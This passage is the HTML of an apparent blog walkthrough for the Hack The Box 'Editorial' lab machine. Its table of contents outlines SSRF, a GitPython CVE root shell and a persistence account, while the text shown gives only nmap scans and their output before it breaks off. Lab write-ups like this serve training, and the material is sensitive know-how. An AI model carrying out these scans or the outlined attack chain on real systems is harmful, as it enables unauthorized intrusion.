@@ -1,0 +1,2102 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.140.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Editorial HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Editorial HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
+                        
+                            Editorial HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
+                        
+                            Doctor HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
+                        
+                            Forest HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
+                        
+                            Driver HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
+                        
+                            Understanding AS-REP Roasting Attacks: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/love-box/" title="./love-box/">
+                        
+                            Love HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Editorial HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.22.12"
+                            >2024.22.12
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        13 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/easy/"
+                            class="tag-btn">
+                            Easy
+                        </a>
+                    
+                        <a
+                            href="/tags/linux/"
+                            class="tag-btn">
+                            Linux
+                        </a>
+                    
+                        <a
+                            href="/tags/web/"
+                            class="tag-btn">
+                            Web
+                        </a>
+                    
+                        <a
+                            href="/tags/api/"
+                            class="tag-btn">
+                            API
+                        </a>
+                    
+                        <a
+                            href="/tags/git/"
+                            class="tag-btn">
+                            git
+                        </a>
+                    
+                        <a
+                            href="/tags/cve-2022-24439/"
+                            class="tag-btn">
+                            CVE-2022-24439
+                        </a>
+                    
+                        <a
+                            href="/tags/ssrf/"
+                            class="tag-btn">
+                            SSRF
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/editorial-box/" class="bread-btn">
+    
+
+    
+        
+            Editorial HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#editorial-hack-the-box-walkthrough-writeup">Editorial Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#web-80">Web <code>80</code>:</a></li>
+        <li><a href="#fuzzing-for-ssrf-with-ffuf">Fuzzing for SSRF with ffuf:</a></li>
+        <li><a href="#abusing-ssrf-to-access-internal-api-endpoints">Abusing SSRF To Access Internal API Endpoints:</a></li>
+        <li><a href="#retrieving-default-credentials-from-the-authors-api-endpoint">Retrieving default credentials from the &ldquo;authors&rdquo; API endpoint:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#accessing-the-host-by-ssh-as-dev">Accessing the host by SSH as dev:</a></li>
+        <li><a href="#enumerating-the-host-as-dev">Enumerating the host as dev:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-lateral-movement">3. Lateral Movement:</a>
+      <ul>
+        <li><a href="#enumerating-as-prod">Enumerating as prod:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#using-cve-2022-24439-gitpython-vulnerability-to-get-a-root-shell-dot">Using CVE-2022-24439 GitPython Vulnerability to get a root shell.</a></li>
+        <li><a href="#why-do-we-need-the-sign-after-bash">Why do we need the <code>%</code> sign after bash:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#creating-a-high-privileged-service-account-for-persistence">Creating a high privileged &ldquo;service&rdquo; account for persistence:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="editorial-hack-the-box-walkthrough-writeup">Editorial Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Editorial">https://app.hackthebox.com/machines/Editorial</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Editorial/scans/nmap%20%20%f0%9f%8d%a3%20main%20%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2011:52:10%20zsh%20%e2%9d%af%20nmap%20$box%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-12-21%2011:52%20GMT%0aNmap%20scan%20report%20for%2010.129.206.26%0aHost%20is%20up%20%280.043s%20latency%29.%0aNot%20shown:%20998%20closed%20tcp%20ports%20%28reset%29%0aPORT%20%20%20STATE%20SERVICE%0a22/tcp%20open%20%20ssh%0a80/tcp%20open%20%20http%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%200.95%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 11:52:10 zsh ❯ nmap $box -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-21 11:52 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.206.26
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.95 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>SSH &amp; Web.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li>
+<p><strong>In depth scan TCP</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%20HTB/BlogEntriesMade/Editorial/scans/nmap%20%20%f0%9f%8d%a3%20main%20%f0%9f%9b%a4%ef%b8%8f%20%20%c3%971%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2011:52:18%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-12-21%2011:52%20GMT%0a%20%20Nmap%20scan%20report%20for%2010.129.206.26%0a%20%20Host%20is%20up%20%280.039s%20latency%29.%0a%20%20Not%20shown:%2065533%20closed%20tcp%20ports%20%28reset%29%0a%20%20PORT%20%20%20STATE%20SERVICE%20VERSION%0a%20%2022/tcp%20open%20%20ssh%20%20%20%20%20OpenSSH%208.9p1%20Ubuntu%203ubuntu0.7%20%28Ubuntu%20Linux;%20protocol%202.0%29%0a%20%20%7c%20ssh-hostkey:%0a%20%20%7c%20%20%20256%200d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64%20%28ECDSA%29%0a%20%20%7c_%20%20256%200f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0%20%28ED25519%29%0a%20%2080/tcp%20open%20%20http%20%20%20%20nginx%201.18.0%20%28Ubuntu%29%0a%20%20%7c_http-server-header:%20nginx/1.18.0%20%28Ubuntu%29%0a%20%20%7c_http-title:%20Did%20not%20follow%20redirect%20to%20http://editorial.htb%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20%29.%0a%20%20TCP/IP%20fingerprint:%0a%20%20OS:SCAN%28V=7.94SVN%25E=4%25D=12/21%25OT=22%25CT=1%25CU=33625%25PV=Y%25DS=2%DC=I%25G=Y%25TM=676%0a%20%20OS:6AC33%25P=x86_64-pc-linux-gnu%29SEQ%28SP=102%25GCD=1%25ISR=108%25TI=Z%25CI=Z%25II=I%25TS=A%0a%20%20OS:%29OPS%28O1=M53CST11NW7%25O2=M53CST11NW7%25O3=M53CNNT11NW7%25O4=M53CST11NW7%25O5=M53%0a%20%20OS:CST11NW7%25O6=M53CST11%29WIN%28W1=FE88%25W2=FE88%25W3=FE88%25W4=FE88%25W5=FE88%25W6=FE88%0a%20%20OS:%29ECN%28R=Y%DF=Y%25T=40%25W=FAF0%25O=M53CNNSNW7%CC=Y%25Q=%29T1%28R=Y%DF=Y%25T=40%25S=O%25A=S&#43;%0a%20%20OS:%25F=AS%25RD=0%25Q=%29T2%28R=N%29T3%28R=N%29T4%28R=Y%DF=Y%25T=40%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=%29%0a%20%20OS:T5%28R=Y%DF=Y%25T=40%25W=0%25S=Z%25A=S&#43;%25F=AR%25O=%25RD=0%25Q=%29T6%28R=Y%DF=Y%25T=40%25W=0%25S=A%25A%0a%20%20OS:=Z%25F=R%25O=%25RD=0%25Q=%29T7%28R=N%29U1%28R=Y%DF=N%25T=40%25IPL=164%25UN=0%25RIPL=G%25RID=G%25RIPC%0a%20%20OS:K=G%25RUCK=G%25RUD=G%29IE%28R=Y%DFI=N%25T=40%CD=S%29%0a%0a%20%20Network%20Distance:%202%20hops%0a%20%20Service%20Info:%20OS:%20Linux;%20CPE:%20cpe:/o:linux:linux_kernel%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2035.24%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 11:52:18 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-21 11:52 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.206.26
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
